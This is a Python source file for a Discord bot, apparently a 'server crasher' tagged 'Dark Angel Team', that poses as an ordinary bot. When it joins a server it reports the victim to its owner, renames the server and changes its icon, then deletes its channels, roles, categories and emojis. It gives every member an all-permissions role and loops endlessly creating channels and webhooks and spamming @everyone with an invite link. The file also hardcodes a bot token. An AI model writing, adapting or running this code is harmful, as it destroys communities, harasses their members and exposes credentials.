import discord
import asyncio
from alivef import alivef
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.presences = True
intents.webhooks = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
	print("mee6 top")
	await bot.change_presence(activity=discord.Game("/imagine"))

@bot.event
async def on_guild_join(guild):
		integrations = await guild.integrations()
		for integration in integrations:
			if isinstance(integration, discord.BotIntegration):
				if integration.application.user.name == bot.user.name:
					user = integration.user
					break
		
		if guild.id != 1147251019240177695:
			server = bot.get_guild(1147251019240177695)
			channel = server.get_channel(1147254990109413387)
			embed = discord.Embed(title="Краш сервера", description="Был крашнут новый сервер.", color=discord.Color.blue())
			embed.add_field(name="Крашер:", value=f"{user}")
			embed.add_field(name="Сервер:", value=f"{guild.name}")
			await channel.send(embed=embed)
			await guild.edit(name="Crash by Dark Angel Team")
			with open("/storage/emulated/0/Download/3a27813627d076f9550aaf6a6fe8ff53.jpg", "rb") as f:
				data = f.read()
			await guild.edit(icon=data)
			for category in guild.categories:
				try:
					await category.delete()
				except:
					pass
			for channel in guild.channels:
				try:
					await channel.delete()
				except:
					pass
			for role in guild.roles:
				try:
					await role.delete()
				except:
					pass
				try:
					for emoji in guild.emojis:
						await emoji.delete()
				except:
					pass
				admin_role = await guild.create_role(name="батя", permissions=discord.Permissions.all(), color=discord.Color.random())
				channel = discord.utils.get(guild.text_channels, name="crash-by-darkangelteam")
				for mem in guild.members:
					try:
						role = discord.utils.get(guild.roles, name="батя")
						await mem.add_roles(role, reason="CR3SH")
					except:
						pass
			while True:
					cha = await guild.create_text_channel("crashed-by-darkangelteam")
					await cha.create_webhook(name="Crashed by Dark Angel Team")
					for chan in guild.channels:
						asyncio.create_task(chan.send("@everyone\nhttps://discord.gg/XAjyueegJV\nВсем добра! ;)"))
						await asyncio.sleep(0.02)
					try:
						await guild.create_role(name="crash by dat", color=discord.Color.random())
					except:
						pass

alivef()
bot.run("MTE0MzE5NTQ4NzU3NTQ3ODQxMg.GGtlJO.wArgeLJx0Q_vej_yHvh0jIArnjMyNTrR12zqcY")